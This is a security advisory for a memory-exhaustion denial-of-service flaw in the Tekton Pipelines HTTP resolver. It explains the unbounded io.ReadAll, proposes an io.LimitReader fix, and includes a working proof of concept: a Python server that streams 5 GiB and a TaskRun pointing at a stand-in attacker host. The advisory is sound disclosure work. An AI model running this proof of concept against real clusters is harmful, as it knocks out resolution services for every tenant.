# [M] Tekton Pipelines: HTTP Resolver Unbounded Response Body Read Enables Denial of Service via Memory Exhaustion

## Summary
Severity: Medium
Advisory: GHSA-m2cx-gpqf-qf74
CVE: CVE-2026-40924
CWE: CWE-400
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-21
Source: https://github.com/advisories/GHSA-m2cx-gpqf-qf74
Type: github-advisory

## Affected
- Go: `github.com/tektoncd/pipeline` — affected >=1.10.0 <1.11.1
- Go: `github.com/tektoncd/pipeline` — affected >=1.0.0 <1.0.2
- Go: `github.com/tektoncd/pipeline` — affected >=1.2.0 <1.3.4
- Go: `github.com/tektoncd/pipeline` — affected >=1.4.0 <1.6.2
- Go: `github.com/tektoncd/pipeline` — affected >=1.7.0 <1.9.3

## Details
## Summary

The HTTP resolver's `FetchHttpResource` function calls `io.ReadAll(resp.Body)` with no response body size limit. Any tenant with permission to create TaskRuns or PipelineRuns that reference the HTTP resolver can point it at an attacker-controlled HTTP server that returns a very large response body within the 1-minute timeout window, causing the `tekton-pipelines-resolvers` pod to be OOM-killed by Kubernetes. Because all resolver types (Git, Hub, Bundle, Cluster, HTTP) run in the same pod, crashing this pod denies resolution service to the entire cluster. Repeated exploitation causes a sustained crash loop. The same vulnerable code path is reached by both the deprecated `pkg/resolution/resolver/http` and the current `pkg/remoteresolution/resolver/http` implementations.

## Details

`pkg/resolution/resolver/http/resolver.go:279–307`:

```go
func FetchHttpResource(ctx context.Context, params map[string]string,
    kubeclient kubernetes.Interface, logger *zap.SugaredLogger) (framework.ResolvedResource, error) {

    httpClient, err := makeHttpClient(ctx)  // default timeout: 1 minute
    // ...
    resp, err := httpClient.Do(req)
    // ...
    defer func() { _ = resp.Body.Close() }()

    body, err := io.ReadAll(resp.Body)  // ← no size limit
    if err != nil {
        return nil, fmt.Errorf("error reading response body: %w", err)
    }
    // ...
}
```

`makeHttpClient` sets `http.Client{Timeout: timeout}` where `timeout` defaults to 1 minute and is configurable via `fetch-timeout` in the `http-resolver-config` ConfigMap. The timeout bounds the duration of the entire request (including body read), which limits slow-drip attacks. However, it does not limit the total number of bytes allocated. A fast HTTP server can deliver multi-gigabyte responses well within the 1-minute window.

The resolver deployment (`config/core/deployments/resolvers-deployment.yaml`) sets a 4 GiB memory limit on the `controller` container. A response of 4 GiB or larger delivered at wire speed will cause `io.ReadAll` to allocate 4 GiB, triggering an OOM-kill. With the default timeout of 60 seconds, a server delivering at 100 MB/s can supply 6 GB — well above the 4 GiB limit — before the timeout fires.

The `remoteresolution` HTTP resolver (`pkg/remoteresolution/resolver/http/resolver.go:90`) delegates directly to the same `FetchHttpResource` function and is equally affected.

## PoC

```bash
# Step 1: Run an HTTP server that streams a large response fast
python3 - <<'EOF'
import http.server, socketserver

class LargeResponseHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.end_headers()
        # Stream 5 GB at full speed — completes in <60s on a local network
        chunk = b"X" * (1024 * 1024)  # 1 MiB chunk
        for _ in range(5120):          # 5120 * 1 MiB = 5 GiB
            self.wfile.write(chunk)

    def log_message(self, *args):
        pass

with socketserver.TCPServer(("", 8080), LargeResponseHandler) as httpd:
    httpd.serve_forever()
EOF

# Step 2: Create a TaskRun that triggers the HTTP resolver
kubectl create -f - <<'EOF'
apiVersion: tekton.dev/v1
kind: TaskRun
metadata:
  name: dos-poc
  namespace: default
spec:
  taskRef:
    resolver: http
    params:
      - name: url
        value: http://attacker-server.internal:8080/large-payload
EOF

# Expected result: tekton-pipelines-resolvers pod is OOM-killed.
# All resolver types in the cluster (git, hub, bundle, cluster, http)
# become unavailable until Kubernetes restarts the pod.
# Repeated submission causes a crash loop that continuously disrupts
# resolution for all tenants in the cluster.
```

**Note:** On clusters where operators have set a higher `fetch-timeout` (e.g., `10m`), the attacker has more time to deliver a larger body, and the attack is more reliable. On clusters with tight memory limits on the resolver pod, a smaller payload suffices.

## Impact

- **Denial of Service**: OOM-kill of the `tekton-pipelines-resolvers` pod denies all resolution services cluster-wide until Kubernetes restarts the pod.
- **Crash loop amplification**: A tenant can submit multiple concurrent TaskRuns pointing to the attack server. Each in-flight resolution request accumulates memory independently in the same pod, reducing the payload size needed to reach the OOM threshold.
- **Blast radius**: Because all resolver types share a single pod, disrupting the HTTP resolver also disrupts unrelated users of the Git, Bundle, Cluster, and Hub resolvers. This is a cluster-wide availability impact achievable by a single namespace-level user.

## Recommended Fix

Wrap `resp.Body` with `io.LimitReader` before passing to `io.ReadAll`. Add a configurable `max-body-size` option to the `http-resolver-config` ConfigMap with a sensible default (e.g., 50 MiB, which exceeds the size of any realistic pipeline YAML file):

```go
const defaultMaxBodyBytes = 50 * 1024 * 1024 // 50 MiB

// In FetchHttpResource, replace:
//   body, err := io.ReadAll(resp.Body)
// with:
maxBytes := int64(defaultMaxBodyBytes)
if v, ok := conf["max-body-size"]; ok {
    if parsed, err := strconv.ParseInt(v, 10, 64); err == nil {
        maxBytes = parsed
    }
}
limitedReader := io.LimitReader(resp.Body, maxBytes+1)
body, err := io.ReadAll(limitedReader)
if err != nil {
    return nil, fmt.Errorf("error reading response body: %w", err)
}
if int64(len(body)) > maxBytes {
    return nil, fmt.Errorf("response body exceeds maximum allowed size of %d bytes", maxBytes)
}
```

This fix must be applied to `FetchHttpResource` in `pkg/resolution/resolver/http/resolver.go`, which is shared by both the deprecated and current HTTP resolver implementations.

## References
- https://github.com/tektoncd/pipeline/security/advisories/GHSA-m2cx-gpqf-qf74
- https://nvd.nist.gov/vuln/detail/CVE-2026-40924
- https://github.com/tektoncd/pipeline
- https://github.com/tektoncd/pipeline/releases/tag/v1.11.1
